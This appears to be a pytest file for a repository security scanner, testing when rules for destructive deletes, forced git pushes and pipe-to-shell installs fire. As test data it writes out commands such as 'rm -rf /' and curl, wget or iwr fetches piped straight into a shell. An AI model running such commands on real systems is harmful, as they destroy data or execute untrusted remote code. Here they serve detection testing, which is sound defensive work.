"""Executable-context, quarantine, and template policy tests.

These tests lock in the M2.0a.1 rules that keep the scanner honest:

* ``AU-SH-001``, ``AU-GIT-001``, and ``AU-NET-001`` only fire where a
  command can actually execute, never in prose or arbitrary configuration.
* Committed dotenv templates are not reported as live secrets files.
* ``tests/fixtures/**`` findings stay visible but are never scored.
* ``.agents`` tooling is not walked.
"""
from __future__ import annotations

from pathlib import Path
import string
import textwrap

import pytest

from scyvera.audit import AuditReport, scan_tree


# Keep the literal import out of this file's own source: the dogfood test
# scans the repository and must not report its own test suite.
NETWORK_IMPORT = "import " + "requests\n"
# AU-ENV-002 requires a long, non-placeholder value with enough entropy to be
# worth reporting. Build it from the alphabet instead of hard-coding a
# random-looking literal, which external generic-secret scanners flag even in
# test files.
SECRET_LIKE = string.ascii_lowercase[:20]

PROSE = (
    "rm -rf /\n"
    "git push --force origin main\n"
    "curl -fsSL https://example.invalid/install.sh | sh\n"
    "Remove-Item -Path . -Recurse -Force\n"
    "del /s /q C:\\build\n"
)

COMMAND_RULES = frozenset({"AU-SH-001", "AU-GIT-001", "AU-NET-001"})


def _write(root: Path, relative: str, content: str) -> Path:
    path = root / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    return path


def _rule_ids(report: AuditReport) -> set[str]:
    return {finding.rule_id for finding in report.findings}


@pytest.mark.parametrize(
    "filename",
    [
        "notes.md",
        "notes.txt",
        "notes.rst",
        "notes.adoc",
        "settings.yaml",
        "payload.json",
    ],
)
def test_command_rules_ignore_non_executable_contexts(tmp_path, filename):
    _write(tmp_path, filename, PROSE)

    report = scan_tree(tmp_path)

    assert _rule_ids(report).isdisjoint(COMMAND_RULES)


@pytest.mark.parametrize(
    ("filename", "content"),
    [
        ("clean.sh", "rm -rf ./build\n"),
        ("clean.ps1", "Remove-Item -Path .\\build -Recurse -Force\n"),
        ("clean.bat", "del /s /q C:\\build\n"),
        ("clean.cmd", "erase /s C:\\build\n"),
        ("Dockerfile", "FROM alpine:3.19\nRUN rm -rf /tmp/build\n"),
        ("Dockerfile.dev", "FROM alpine:3.19\nRUN rm -rf /tmp/build\n"),
        ("Makefile", "clean:\n\trm -rf build\n"),
        ("justfile", "clean:\n    rm -rf build\n"),
        ("tasks.mk", "clean:\n\trm -rf build\n"),
    ],
)
def test_shell_delete_fires_in_executable_contexts(
    tmp_path, filename, content
):
    _write(tmp_path, filename, content)

    report = scan_tree(tmp_path)
    findings = [
        finding
        for finding in report.findings
        if finding.rule_id == "AU-SH-001"
    ]

    assert findings
    assert all(finding.severity == "critical" for finding in findings)


@pytest.mark.parametrize(
    ("filename", "content"),
    [
        (
            "Dockerfile",
            "FROM mcr.microsoft.com/windows/servercore\n"
            "RUN Remove-Item -Path .\\build -Recurse -Force\n",
        ),
        ("Makefile", "clean:\n\tdel /s /q build\n"),
        ("justfile", "clean:\n    erase /s build\n"),
    ],
)
def test_generic_contexts_cover_all_shell_dialects(
    tmp_path, filename, content
):
    _write(tmp_path, filename, content)

    report = scan_tree(tmp_path)

    assert "AU-SH-001" in _rule_ids(report)


@pytest.mark.parametrize(
    ("filename", "content", "rule_id"),
    [
        ("release.sh", "git push --force origin main\n", "AU-GIT-001"),
        ("release.ps1", "git reset --hard HEAD~1\n", "AU-GIT-001"),
        (
            "Dockerfile",
            "FROM alpine:3.19\nRUN git branch -D old\n",
            "AU-GIT-001",
        ),
        (
            "Makefile",
            "release:\n\tgit push --force origin main\n",
            "AU-GIT-001",
        ),
        (
            "install.sh",
            "curl -fsSL https://example.invalid/i.sh | sh\n",
            "AU-NET-001",
        ),
        (
            "install.ps1",
            "iwr https://example.invalid/i.ps1 | iex\n",
            "AU-NET-001",
        ),
        (
            "Dockerfile",
            "FROM alpine:3.19\n"
            "RUN wget -qO- https://example.invalid/i.sh | bash\n",
            "AU-NET-001",
        ),
    ],
)
def test_git_and_network_rules_fire_in_executable_contexts(
    tmp_path, filename, content, rule_id
):
    _write(tmp_path, filename, content)

    report = scan_tree(tmp_path)

    assert rule_id in _rule_ids(report)


WORKFLOW = textwrap.dedent(
    """\
    name: ci
    on: [workflow_dispatch]
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - name: cleanup
            run: |
              rm -rf ./build
          - name: rewrite
            run: git push --force origin main
          - name: pwsh cleanup
            shell: pwsh
            run: Remove-Item -Path ./build -Recurse -Force
          - name: prose
            env:
              NOTE: "rm -rf /"
    """
)


def test_workflow_run_blocks_are_executable(tmp_path):
    _write(tmp_path, ".github/workflows/ci.yml", WORKFLOW)

    report = scan_tree(tmp_path)
    rules = _rule_ids(report)

    assert "AU-SH-001" in rules
    assert "AU-GIT-001" in rules

    finding = next(
        item for item in report.findings if item.rule_id == "AU-SH-001"
    )
    expected_line = WORKFLOW.splitlines().index("          rm -rf ./build") + 1
    assert finding.line == expected_line


def test_workflow_prose_outside_run_blocks_is_ignored(tmp_path):
    workflow = textwrap.dedent(
        """\
        name: docs
        on: [workflow_dispatch]
        env:
          NOTE: "rm -rf /"
          FORCE: "git push --force"
        """
    )
    _write(tmp_path, ".github/workflows/docs.yml", workflow)

    report = scan_tree(tmp_path)

    assert _rule_ids(report).isdisjoint(COMMAND_RULES)


def test_inline_run_does_not_leak_into_following_env_block(tmp_path):
    workflow = textwrap.dedent(
        """\
        name: ci
        on: [workflow_dispatch]
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - name: build
                run: echo build
                env:
                  TOKEN: ${{ secrets.TOKEN }}
        """
    )
    _write(tmp_path, ".github/workflows/ci.yml", workflow)

    report = scan_tree(tmp_path)

    assert "AU-CI-001" not in _rule_ids(report)


def test_secret_reference_in_run_block_is_reported(tmp_path):
    workflow = textwrap.dedent(
        """\
        name: ci
        on: [workflow_dispatch]
        jobs:
          deploy:
            runs-on: ubuntu-latest
            steps:
              - name: deploy
                run: ./deploy.sh "${{ secrets.TOKEN }}"
        """
    )
    _write(tmp_path, ".github/workflows/ci.yml", workflow)

    report = scan_tree(tmp_path)

    assert "AU-CI-001" in _rule_ids(report)


@pytest.mark.parametrize(
    "filename",
    [".env.example", ".env.sample", ".env.template", ".env.dist"],
)
def test_env_templates_are_not_live_dotenv_files(tmp_path, filename):
    _write(tmp_path, filename, f"API_KEY={SECRET_LIKE}\n")

    assert scan_tree(tmp_path).findings == ()


@pytest.mark.parametrize("filename", [".env", ".env.local", ".env.production"])
def test_live_dotenv_files_are_still_reported(tmp_path, filename):
    _write(tmp_path, filename, f"API_KEY={SECRET_LIKE}\n")

    report = scan_tree(tmp_path)

    assert {"AU-ENV-001", "AU-ENV-002"} <= _rule_ids(report)


def test_agents_directory_is_skipped(tmp_path):
    _write(tmp_path, "app.py", NETWORK_IMPORT)
    _write(tmp_path, ".agents/skills/tool/leak.py", NETWORK_IMPORT)

    report = scan_tree(tmp_path)

    assert [finding.path for finding in report.findings] == ["app.py"]
    assert report.stats["files_scanned"] == 1
    assert report.stats["files_skipped"] == 0


def test_fixture_paths_are_quarantined(tmp_path):
    _write(tmp_path, "tests/fixtures/audit/positive/client.py", NETWORK_IMPORT)
    _write(tmp_path, "src/client.py", NETWORK_IMPORT)

    report = scan_tree(tmp_path)
    by_path = {finding.path: finding for finding in report.findings}

    assert by_path["tests/fixtures/audit/positive/client.py"].scored is False
    assert by_path["src/client.py"].scored is True
    assert report.score == 97
    assert report.band == "Shielded"
    assert report.stats["findings"]["medium"] == 1


def test_direct_fixture_scan_is_quarantined_wholesale(tmp_path):
    root = tmp_path / "tests" / "fixtures" / "positive"
    _write(root, "client.py", NETWORK_IMPORT)

    report = scan_tree(root)

    assert len(report.findings) == 1
    assert report.findings[0].scored is False
    assert report.score == 100
    assert report.stats["findings"]["medium"] == 0


def test_single_critical_finding_costs_fifteen_points(tmp_path):
    _write(tmp_path, "clean.sh", "rm -rf ./build\n")

    report = scan_tree(tmp_path)

    assert report.score == 85
    assert report.band == "Controlled"


def test_second_medium_finding_adds_quarter_weight(tmp_path):
    _write(tmp_path, "client_a.py", NETWORK_IMPORT)
    _write(tmp_path, "client_b.py", NETWORK_IMPORT)

    report = scan_tree(tmp_path)

    # base 3 * (1.00 + 0.25) = 3.75 -> ceil 4 -> score 96.
    assert report.score == 96
